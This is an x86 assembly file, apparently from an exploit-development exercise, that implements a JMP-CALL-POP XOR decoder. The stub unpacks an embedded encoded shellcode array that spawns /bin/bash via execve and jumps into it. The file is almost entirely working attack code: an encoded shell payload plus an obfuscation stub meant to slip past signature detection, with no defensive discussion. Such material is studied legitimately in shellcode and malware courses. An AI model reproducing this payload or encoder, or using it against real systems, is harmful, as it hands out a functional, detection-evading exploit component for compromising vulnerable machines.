; Author: Timo Humphrey
; XOR Decoding with a JumpCallPop
; Using a MARKER 0x00 (XOR 0xAA)

global _start

section .text
_start:
	jmp short call_decoder	; Start of JumpCallPop

decoder_init:
	pop esi			; POP addr of Shellcode off stack

decoder:
	xor byte [esi], 0xAA	; XOR byte at ESI (decode it).
	jz Shellcode		; If XOR equals ZERO (end of Shellcode), ZF Set, EIP to Shellcode to begin executing!
				; If we have *not* hit the Marker (0xAA which XORs to 0x00), continue.
	inc esi			; Increment Addr in ESI (next byte)
	jmp short decoder	; JMP back to top of decoder to XOR the next byte.

call_decoder:
	call decoder_init	; This essentially puts Shellcode on the stack (JCP)!
	; Shellcode is the XOR encoded Shellcode with a 0xaa added to the end.
	; The 0xaa when XOR'd with 0xaa will create a ZERO value (our MARKER)!
	Shellcode: db 0x9b,0x6a,0xfa,0x23,0x48,0xc2,0xc8,0xcb,0xd9,0xc2,0xc2,0x85,0x85,0x85,0x85,0xc2,0x85,0xc8,0xc3,0xc4,0x23,0x49,0xfa,0xf9,0x23,0x4b,0x1a,0xa1,0x67,0x2a,0xaa
